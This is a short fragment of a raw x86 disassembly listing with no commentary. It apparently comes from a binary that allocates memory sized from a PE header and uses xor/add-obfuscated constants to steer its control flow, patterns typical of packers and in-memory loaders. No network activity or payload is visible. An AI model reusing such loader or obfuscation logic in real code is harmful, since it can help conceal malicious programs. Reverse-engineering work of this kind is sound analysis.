  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
